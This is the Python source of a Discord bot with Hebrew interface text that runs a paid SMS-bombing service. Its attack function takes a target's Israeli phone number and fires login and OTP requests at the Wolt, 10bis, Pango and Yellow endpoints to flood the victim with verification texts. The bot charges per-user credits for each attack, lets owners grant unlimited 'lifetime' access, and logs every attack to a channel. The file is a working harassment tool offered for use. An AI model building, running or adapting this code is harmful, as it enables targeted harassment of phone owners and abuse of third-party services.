import discord
from discord import app_commands
from discord.ext import commands
import os, json, httpx, asyncio, datetime
from flask import Flask
from threading import Thread

# --- Render Keep-Alive ---
app = Flask('')
@app.route('/')
def home(): return "Bot Online"
def run():
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 8080)))
def keep_alive():
    Thread(target=run).start()

# --- הגדרות ---
TOKEN = os.getenv("DISCORD_TOKEN")
OWNER_ROLE_NAME = "Owner"
MY_USER_ID = 1499077731659284540 
LOG_CHANNEL_ID = 1499510962296721568
DB_FILE = "database.json"

def get_data():
    if not os.path.exists(DB_FILE): return {"credits": {}, "blacklist": []}
    with open(DB_FILE, "r") as f:
        try: return json.load(f)
        except: return {"credits": {}, "blacklist": []}

def save_data(data):
    with open(DB_FILE, "w") as f: json.dump(data, f, indent=4)

async def send_log(bot, title, description, color=discord.Color.blue()):
    try:
        channel = await bot.fetch_channel(LOG_CHANNEL_ID)
        embed = discord.Embed(title=title, description=description, color=color, timestamp=datetime.datetime.now())
        await channel.send(embed=embed)
    except Exception as e:
        print(f"Log Error: {e}")

# --- מנוע תקיפה ---
async def run_attack(phone):
    clean_p = phone[1:] if phone.startswith('0') else phone
    success, failed = 0, 0
    targets = [
        {"url": "https://api.wolt.com/v1/user/login/otp", "json": {"phone": f"+972{clean_p}"}},
        {"url": "https://www.10bis.co.il/NextApi/User/Login", "json": {"phoneNumber": phone, "isSmsAuth": True}},
        {"url": "https://pango.co.il/api/auth/login", "json": {"phone": phone}},
        {"url": "https://yellow.co.il/api/v1/auth/register-otp", "json": {"phone": phone}}
    ]
    headers = {"User-Agent": "Mozilla/5.0"}
    async with httpx.AsyncClient(verify=False, timeout=10.0) as client:
        for t in targets:
            try:
                resp = await client.post(t["url"], json=t["json"], headers=headers)
                if 200 <= resp.status_code < 300: success += 1
                else: failed += 1
            except: failed += 1
    return success, failed

# --- UI ---
class AttackModal(discord.ui.Modal, title="Vouge - Attack"):
    phone = discord.ui.TextInput(label="מספר טלפון", placeholder="05XXXXXXXX", min_length=10, max_length=10)
    async def on_submit(self, interaction: discord.Interaction):
        data = get_data()
        uid = str(interaction.user.id)
        is_owner = discord.utils.get(interaction.user.roles, name=OWNER_ROLE_NAME) or interaction.user.id == MY_USER_ID
        
        if self.phone.value in data["blacklist"]:
            return await interaction.response.send_message("❌ חסום!", ephemeral=True)
        
        user_bal = data["credits"].get(uid, 0)
        if not is_owner and user_bal <= 0:
            return await interaction.response.send_message("❌ אין קרדיטים!", ephemeral=True)
        
        if not is_owner:
            data["credits"][uid] -= 1
            save_data(data)

        await interaction.response.send_message(f"💣 תוקף את {self.phone.value}...", ephemeral=True)
        s, f = await run_attack(self.phone.value)
        await send_log(interaction.client, "🚀 תקיפה", f"משתמש: {interaction.user.mention}\nיעד: {self.phone.value}\nהצלחות: {s}, כשלונות: {f}", discord.Color.red())

class ControlPanelView(discord.ui.View):
    def __init__(self): super().__init__(timeout=None)
    @discord.ui.button(label="Start Attack", style=discord.ButtonStyle.danger, emoji="🚀", custom_id="at_btn")
    async def at_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(AttackModal())

class MyBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.members = True
        intents.message_content = True
        super().__init__(command_prefix="!", intents=intents)
    async def setup_hook(self):
        self.add_view(ControlPanelView())
        await self.tree.sync()

bot = MyBot()

def is_owner(interaction: discord.Interaction):
    return discord.utils.get(interaction.user.roles, name=OWNER_ROLE_NAME) or interaction.user.id == MY_USER_ID

@bot.tree.command(name="setup")
async def setup(interaction: discord.Interaction):
    if not is_owner(interaction): return await interaction.response.send_message("❌ חסום", ephemeral=True)
    await interaction.response.send_message(embed=discord.Embed(title="🛡️ Vouge Panel", color=discord.Color.red()), view=ControlPanelView())

@bot.tree.command(name="lifetime")
async def lifetime(interaction: discord.Interaction, member: discord.Member):
    if not is_owner(interaction): return
    data = get_data()
    data["credits"][str(member.id)] = 999999
    save_data(data)
    await interaction.response.send_message(f"👑 {member.mention} קיבל לייפטיים!")

@bot.tree.command(name="remove_lifetime")
async def rm_lifetime(interaction: discord.Interaction, member: discord.Member):
    if not is_owner(interaction): return
    data = get_data()
    data["credits"][str(member.id)] = 0
    save_data(data)
    await interaction.response.send_message(f"🚫 הוסר לייפטיים ל-{member.mention}")

@bot.tree.command(name="addcredit")
async def add_cr(interaction: discord.Interaction, member: discord.Member, amount: int):
    if not is_owner(interaction): return
    data = get_data()
    data["credits"][str(member.id)] = data["credits"].get(str(member.id), 0) + amount
    save_data(data)
    await interaction.response.send_message(f"✅ נוספו {amount} ל-{member.mention}")

if __name__ == "__main__":
    keep_alive()
    bot.run(TOKEN)
